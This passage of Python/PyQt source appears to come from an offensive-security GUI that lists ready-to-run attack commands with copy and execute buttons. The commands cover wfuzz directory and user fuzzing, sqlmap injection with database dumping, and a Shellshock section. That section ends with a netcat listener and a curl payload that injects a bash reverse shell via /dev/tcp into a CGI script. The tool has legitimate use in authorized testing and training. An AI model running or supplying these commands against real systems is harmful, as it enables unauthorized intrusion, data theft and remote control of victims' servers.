        self.wfuzzD_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzD_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzD_Scan3.text() + "; bash"
        self.wfuzzD_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzD_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzD_Scan3_Copy)
        label_layout.addWidget(self.wfuzzD_Scan3_Run)
        label_layout.addWidget(self.wfuzzD_Scan3)
        self.tab2_container_layout.insertLayout(60, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzD_Scan4
        if hasattr(self, 'wfuzzD_Scan4'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan4)
            self.wfuzzD_Scan4.deleteLater()
        self.wfuzzD_Scan4 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
        self.wfuzzD_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzD_Scan4 copy button
        if hasattr(self, 'wfuzzD_Scan4_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan4_Copy)
            self.wfuzzD_Scan4_Copy.deleteLater()
        self.wfuzzD_Scan4_Copy = QPushButton()
        self.wfuzzD_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzD_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wfuzzD_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan4.text()))
        self.wfuzzD_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan4 run button
        if hasattr(self, 'wfuzzD_Scan4_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan4_Run)
            self.wfuzzD_Scan4_Run.deleteLater()
        self.wfuzzD_Scan4_Run = QPushButton()
        self.wfuzzD_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzD_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzD_Scan4.text() + "; bash"
        self.wfuzzD_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzD_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzD_Scan4_Copy)
        label_layout.addWidget(self.wfuzzD_Scan4_Run)
        label_layout.addWidget(self.wfuzzD_Scan4)
        self.tab2_container_layout.insertLayout(61, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzD_spacer1
        if hasattr(self, 'wfuzzD_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_spacer1)
            self.wfuzzD_spacer1.deleteLater()
        self.wfuzzD_spacer1 = QLabel()
        self.wfuzzD_spacer1.setFixedWidth(40)
        self.wfuzzD_spacer1.setFixedHeight(20)

        # wfuzzD_spacer & divider layout
        self.tab2_container_layout.insertWidget(62, self.wfuzzD_spacer1)

# wfuzzF
        if hasattr(self, 'wfuzzF'):
            self.tab2_container_layout.removeWidget(self.wfuzzF)
            self.wfuzzF.deleteLater()
        self.wfuzzF = QLabel("[+ Wfuzz Fuzz Files]")
        self.wfuzzF = QLabel("[+ WFuzz Fuzz Files:]")
        self.wfuzzF.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(63,self.wfuzzF)

        # wfuzzF_Scan1
        if hasattr(self, 'wfuzzF_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan1)
            self.wfuzzF_Scan1.deleteLater()
        self.wfuzzF_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzF_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzF_Scan1 copy button
        if hasattr(self, 'wfuzzF_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan1_Copy)
            self.wfuzzF_Scan1_Copy.deleteLater()
        self.wfuzzF_Scan1_Copy = QPushButton()
        self.wfuzzF_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzF_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzF_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan1.text()))
        self.wfuzzF_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan1 run button
        if hasattr(self, 'wfuzzF_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan1_Run)
            self.wfuzzF_Scan1_Run.deleteLater()
        self.wfuzzF_Scan1_Run = QPushButton()
        self.wfuzzF_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzF_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzF_Scan1.text() + "; bash"
        self.wfuzzF_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzF_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzF_Scan1_Copy)
        label_layout.addWidget(self.wfuzzF_Scan1_Run)
        label_layout.addWidget(self.wfuzzF_Scan1)
        self.tab2_container_layout.insertLayout(64, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzF_Scan2
        if hasattr(self, 'wfuzzF_Scan2'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan2)
            self.wfuzzF_Scan2.deleteLater()
        self.wfuzzF_Scan2 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzF_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzF_Scan2 copy button
        if hasattr(self, 'wfuzzF_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan2_Copy)
            self.wfuzzF_Scan2_Copy.deleteLater()
        self.wfuzzF_Scan2_Copy = QPushButton()
        self.wfuzzF_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzF_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wfuzzF_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan2.text()))
        self.wfuzzF_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan2 run button
        if hasattr(self, 'wfuzzF_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan2_Run)
            self.wfuzzF_Scan2_Run.deleteLater()
        self.wfuzzF_Scan2_Run = QPushButton()
        self.wfuzzF_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzF_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzF_Scan2.text() + "; bash"
        self.wfuzzF_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzF_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzF_Scan2_Copy)
        label_layout.addWidget(self.wfuzzF_Scan2_Run)
        label_layout.addWidget(self.wfuzzF_Scan2)
        self.tab2_container_layout.insertLayout(65, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzF_Scan3
        if hasattr(self, 'wfuzzF_Scan3'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan3)
            self.wfuzzF_Scan3.deleteLater()
        self.wfuzzF_Scan3 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzF_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzF_Scan3 copy button
        if hasattr(self, 'wfuzzF_Scan3_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan3_Copy)
            self.wfuzzF_Scan3_Copy.deleteLater()
        self.wfuzzF_Scan3_Copy = QPushButton()
        self.wfuzzF_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzF_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wfuzzF_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan3.text()))
        self.wfuzzF_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan3 run button
        if hasattr(self, 'wfuzzF_Scan3_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan3_Run)
            self.wfuzzF_Scan3_Run.deleteLater()
        self.wfuzzF_Scan3_Run = QPushButton()
        self.wfuzzF_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzF_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzF_Scan3.text() + "; bash"
        self.wfuzzF_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzF_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzF_Scan3_Copy)
        label_layout.addWidget(self.wfuzzF_Scan3_Run)
        label_layout.addWidget(self.wfuzzF_Scan3)
        self.tab2_container_layout.insertLayout(66, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzF_Scan4
        if hasattr(self, 'wfuzzF_Scan4'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan4)
            self.wfuzzF_Scan4.deleteLater()
        self.wfuzzF_Scan4 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzF_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzF_Scan4 copy button
        if hasattr(self, 'wfuzzF_Scan4_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan4_Copy)
            self.wfuzzF_Scan4_Copy.deleteLater()
        self.wfuzzF_Scan4_Copy = QPushButton()
        self.wfuzzF_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzF_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wfuzzF_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan4.text()))
        self.wfuzzF_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan4 run button
        if hasattr(self, 'wfuzzF_Scan4_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan4_Run)
            self.wfuzzF_Scan4_Run.deleteLater()
        self.wfuzzF_Scan4_Run = QPushButton()
        self.wfuzzF_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzF_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzF_Scan4.text() + "; bash"
        self.wfuzzF_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzF_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzF_Scan4_Copy)
        label_layout.addWidget(self.wfuzzF_Scan4_Run)
        label_layout.addWidget(self.wfuzzF_Scan4)
        self.tab2_container_layout.insertLayout(67, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzF_spacer1
        if hasattr(self, 'wfuzzF_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_spacer1)
            self.wfuzzF_spacer1.deleteLater()
        self.wfuzzF_spacer1 = QLabel()
        self.wfuzzF_spacer1.setFixedWidth(40)
        self.wfuzzF_spacer1.setFixedHeight(20)

        # wfuzzF_spacer & divider layout
        self.tab2_container_layout.insertWidget(68, self.wfuzzF_spacer1)

# wfuzzUsers
        if hasattr(self, 'wfuzzUsers'):
            self.tab2_container_layout.removeWidget(self.wfuzzUsers)
            self.wfuzzUsers.deleteLater()
        self.wfuzzUsers = QLabel("[+ Wfuzz Users]")
        self.wfuzzUsers.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(69,self.wfuzzUsers)

        # wfuzzUsers_Scan1
        if hasattr(self, 'wfuzzUsers_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzUsers_Scan1)
            self.wfuzzUsers_Scan1.deleteLater()
        self.wfuzzUsers_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt --hc 404,403  \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzUsers_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzUsers_Scan1 copy button
        if hasattr(self, 'wfuzzUsers_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzUsers_Scan1_Copy)
            self.wfuzzUsers_Scan1_Copy.deleteLater()
        self.wfuzzUsers_Scan1_Copy = QPushButton()
        self.wfuzzUsers_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzUsers_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzUsers_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzUsers_Scan1.text()))
        self.wfuzzUsers_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzUsers_Scan1 run button
        if hasattr(self, 'wfuzzUsers_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzUsers_Scan1_Run)
            self.wfuzzUsers_Scan1_Run.deleteLater()
        self.wfuzzUsers_Scan1_Run = QPushButton()
        self.wfuzzUsers_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzUsers_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzUsers_Scan1.text() + "; bash"
        self.wfuzzUsers_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzUsers_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzUsers_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzUsers_Scan1_Copy)
        label_layout.addWidget(self.wfuzzUsers_Scan1_Run)
        label_layout.addWidget(self.wfuzzUsers_Scan1)
        self.tab2_container_layout.insertLayout(70, label_layout)
        self.tab2_container_layout.addStretch()

         # wfuzz_divider 1
        if hasattr(self, 'wfuzz_divider1'):
            self.tab2_container_layout.removeWidget(self.wfuzz_divider1)
            self.wfuzz_divider1.deleteLater()
        self.wfuzz_divider1 = QFrame()
        self.wfuzz_divider1.setFrameShape(QFrame.HLine)
        self.wfuzz_divider1.setLineWidth(3)
        self.wfuzz_divider1.setStyleSheet("color: #20C20E;")
        
        # wfuzz_divider2
        if hasattr(self, 'wfuzz_divider2'):
            self.tab2_container_layout.removeWidget(self.wfuzz_divider2)
            self.wfuzz_divider2.deleteLater()
        self.wfuzz_divider2 = QFrame()
        self.wfuzz_divider2.setFrameShape(QFrame.HLine)
        self.wfuzz_divider2.setLineWidth(3)
        self.wfuzz_divider2.setStyleSheet("color: #20C20E;")
        
        # wfuzz_spacer1
        if hasattr(self, 'wfuzz_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzz_spacer1)
            self.wfuzz_spacer1.deleteLater()
        self.wfuzz_spacer1 = QLabel()
        self.wfuzz_spacer1.setFixedWidth(40)
        self.wfuzz_spacer1.setFixedHeight(50)
        
        # wfuzz_spacer2
        if hasattr(self, 'wfuzz_spacer2'):
            self.tab2_container_layout.removeWidget(self.wfuzz_spacer2)
            self.wfuzz_spacer2.deleteLater()
        self.wfuzz_spacer2 = QLabel()
        self.wfuzz_spacer2.setFixedWidth(40)
        self.wfuzz_spacer2.setFixedHeight(50)

        # wfuzz_spacer & divider layout
        self.tab2_container_layout.insertWidget(71, self.wfuzz_spacer1)
        self.tab2_container_layout.insertWidget(72, self.wfuzz_divider1)
        self.tab2_container_layout.insertWidget(73, self.wfuzz_divider2)
        self.tab2_container_layout.insertWidget(74, self.wfuzz_spacer2)
        self.tab2_container_layout.addStretch()

# SQLMap
        if hasattr(self, 'SQLMap'):
            self.tab2_container_layout.removeWidget(self.SQLMap)
            self.SQLMap.deleteLater()
        self.SQLMap = QLabel("[+ SQLMap]")
        self.SQLMap.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(75,self.SQLMap)

        # SQLMap_Scan1
        if hasattr(self, 'SQLMap_Scan1'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan1)
            self.SQLMap_Scan1.deleteLater()
        self.SQLMap_Scan1 = QLabel(f"sqlmap -u http://{self.rhost}:{self.rport} --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl")
        self.SQLMap_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # SQLMap_Scan1 copy button
        if hasattr(self, 'SQLMap_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan1_Copy)
            self.SQLMap_Scan1_Copy.deleteLater()
        self.SQLMap_Scan1_Copy = QPushButton()
        self.SQLMap_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.SQLMap_Scan1_Copy.setFixedSize(QSize(20,20))
        self.SQLMap_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.SQLMap_Scan1.text()))
        self.SQLMap_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # SQLMap_Scan1 run button
        if hasattr(self, 'SQLMap_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan1_Run)
            self.SQLMap_Scan1_Run.deleteLater()
        self.SQLMap_Scan1_Run = QPushButton()
        self.SQLMap_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.SQLMap_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.SQLMap_Scan1.text() + "; bash"
        self.SQLMap_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.SQLMap_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # SQLMap_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.SQLMap_Scan1_Copy)
        label_layout.addWidget(self.SQLMap_Scan1_Run)
        label_layout.addWidget(self.SQLMap_Scan1)
        self.tab2_container_layout.insertLayout(76, label_layout)
        self.tab2_container_layout.addStretch()

        # SQLMap_Scan2
        if hasattr(self, 'SQLMap_Scan2'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan2)
            self.SQLMap_Scan2.deleteLater()
        self.SQLMap_Scan2 = QLabel(f"sqlmap -u http://{self.rhost}:{self.rport} --threads=2 --time-sec=10 --level=4 --risk=3 --dump")
        self.SQLMap_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # SQLMap_Scan2 copy button
        if hasattr(self, 'SQLMap_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan2_Copy)
            self.SQLMap_Scan2_Copy.deleteLater()
        self.SQLMap_Scan2_Copy = QPushButton()
        self.SQLMap_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.SQLMap_Scan2_Copy.setFixedSize(QSize(20,20))
        self.SQLMap_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.SQLMap_Scan2.text()))
        self.SQLMap_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # SQLMap_Scan2 run button
        if hasattr(self, 'SQLMap_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan2_Run)
            self.SQLMap_Scan2_Run.deleteLater()
        self.SQLMap_Scan2_Run = QPushButton()
        self.SQLMap_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.SQLMap_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.SQLMap_Scan2.text() + "; bash"
        self.SQLMap_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.SQLMap_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # SQLMap_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.SQLMap_Scan2_Copy)
        label_layout.addWidget(self.SQLMap_Scan2_Run)
        label_layout.addWidget(self.SQLMap_Scan2)
        self.tab2_container_layout.insertLayout(77, label_layout)
        self.tab2_container_layout.addStretch()

        # sqlmap_divider 1
        if hasattr(self, 'sqlmap_divider1'):
            self.tab2_container_layout.removeWidget(self.sqlmap_divider1)
            self.sqlmap_divider1.deleteLater()
        self.sqlmap_divider1 = QFrame()
        self.sqlmap_divider1.setFrameShape(QFrame.HLine)
        self.sqlmap_divider1.setLineWidth(3)
        self.sqlmap_divider1.setStyleSheet("color: #20C20E;")
        
        # sqlmap_divider2
        if hasattr(self, 'sqlmap_divider2'):
            self.tab2_container_layout.removeWidget(self.sqlmap_divider2)
            self.sqlmap_divider2.deleteLater()
        self.sqlmap_divider2 = QFrame()
        self.sqlmap_divider2.setFrameShape(QFrame.HLine)
        self.sqlmap_divider2.setLineWidth(3)
        self.sqlmap_divider2.setStyleSheet("color: #20C20E;")
        
        # sqlmap_spacer1
        if hasattr(self, 'sqlmap_spacer1'):
            self.tab2_container_layout.removeWidget(self.sqlmap_spacer1)
            self.sqlmap_spacer1.deleteLater()
        self.sqlmap_spacer1 = QLabel()
        self.sqlmap_spacer1.setFixedWidth(40)
        self.sqlmap_spacer1.setFixedHeight(50)
        
        # sqlmap_spacer2
        if hasattr(self, 'sqlmap_spacer2'):
            self.tab2_container_layout.removeWidget(self.sqlmap_spacer2)
            self.sqlmap_spacer2.deleteLater()
        self.sqlmap_spacer2 = QLabel()
        self.sqlmap_spacer2.setFixedWidth(40)
        self.sqlmap_spacer2.setFixedHeight(50)

        # sqlmap_spacer & divider layout
        self.tab2_container_layout.insertWidget(78, self.sqlmap_spacer1)
        self.tab2_container_layout.insertWidget(79, self.sqlmap_divider1)
        self.tab2_container_layout.insertWidget(80, self.sqlmap_divider2)
        self.tab2_container_layout.insertWidget(81, self.sqlmap_spacer2)
        self.tab2_container_layout.addStretch()

# shellshockTest
        if hasattr(self, 'shellshockTest'):
            self.tab2_container_layout.removeWidget(self.shellshockTest)
            self.shellshockTest.deleteLater()
        self.shellshockTest = QLabel("[+ Test for Shell Shock]")
        self.shellshockTest.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(82,self.shellshockTest)

        # shellshockTest_Scan1
        if hasattr(self, 'shellshockTest_Scan1'):
            self.tab2_container_layout.removeWidget(self.shellshockTest_Scan1)
            self.shellshockTest_Scan1.deleteLater()
        self.shellshockTest_Scan1 = QLabel("curl -H 'User-Agent: () { :; }; echo \"VULNERABLE TO SHELLSHOCK\"' http://" + self.rhost + ":" + self.rport + "/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'")
        self.shellshockTest_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # shellshockTest_Scan1 copy button
        if hasattr(self, 'shellshockTest_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.shellshockTest_Scan1_Copy)
            self.shellshockTest_Scan1_Copy.deleteLater()
        self.shellshockTest_Scan1_Copy = QPushButton()
        self.shellshockTest_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.shellshockTest_Scan1_Copy.setFixedSize(QSize(20,20))
        self.shellshockTest_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.shellshockTest_Scan1.text()))
        self.shellshockTest_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockTest_Scan1 run button
        if hasattr(self, 'shellshockTest_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.shellshockTest_Scan1_Run)
            self.shellshockTest_Scan1_Run.deleteLater()
        self.shellshockTest_Scan1_Run = QPushButton()
        self.shellshockTest_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.shellshockTest_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.shellshockTest_Scan1.text() + "; bash"
        self.shellshockTest_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.shellshockTest_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockTest_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.shellshockTest_Scan1_Copy)
        label_layout.addWidget(self.shellshockTest_Scan1_Run)
        label_layout.addWidget(self.shellshockTest_Scan1)
        self.tab2_container_layout.insertLayout(83, label_layout)
        self.tab2_container_layout.addStretch()

        # shellshockTest_spacer1
        if hasattr(self, 'shellshockTest_spacer1'):
            self.tab2_container_layout.removeWidget(self.shellshockTest_spacer1)
            self.shellshockTest_spacer1.deleteLater()
        self.shellshockTest_spacer1 = QLabel()
        self.shellshockTest_spacer1.setFixedWidth(40)
        self.shellshockTest_spacer1.setFixedHeight(20)

        # shellshockTest_spacer & divider layout
        self.tab2_container_layout.insertWidget(84, self.shellshockTest_spacer1)

# shellshockExploit
        if hasattr(self, 'shellshockExploit'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit)
            self.shellshockExploit.deleteLater()
        self.shellshockExploit = QLabel("[+ Exploit Shell Shock]")
        self.shellshockExploit.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(85,self.shellshockExploit)

        # shellshockExploit_Scan1
        if hasattr(self, 'shellshockExploit_Scan1'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan1)
            self.shellshockExploit_Scan1.deleteLater()
        self.shellshockExploit_Scan1 = QLabel("nc -nlvp " + self.lport)
        self.shellshockExploit_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # shellshockExploit_Scan1 copy button
        if hasattr(self, 'shellshockExploit_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan1_Copy)
            self.shellshockExploit_Scan1_Copy.deleteLater()
        self.shellshockExploit_Scan1_Copy = QPushButton()
        self.shellshockExploit_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.shellshockExploit_Scan1_Copy.setFixedSize(QSize(20,20))
        self.shellshockExploit_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.shellshockExploit_Scan1.text()))
        self.shellshockExploit_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockExploit_Scan1 run button
        if hasattr(self, 'shellshockExploit_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan1_Run)
            self.shellshockExploit_Scan1_Run.deleteLater()
        self.shellshockExploit_Scan1_Run = QPushButton()
        self.shellshockExploit_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.shellshockExploit_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.shellshockExploit_Scan1.text() + "; bash"
        self.shellshockExploit_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.shellshockExploit_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockExploit_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.shellshockExploit_Scan1_Copy)
        label_layout.addWidget(self.shellshockExploit_Scan1_Run)
        label_layout.addWidget(self.shellshockExploit_Scan1)
        self.tab2_container_layout.insertLayout(86, label_layout)
        self.tab2_container_layout.addStretch()

        # shellshockExploit_Scan2
        if hasattr(self, 'shellshockExploit_Scan2'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan2)
            self.shellshockExploit_Scan2.deleteLater()
        self.shellshockExploit_Scan2 = QLabel("curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1' http://" + self.rhost + ":" + self.rport + "/cgi-bin/admin.cgi")
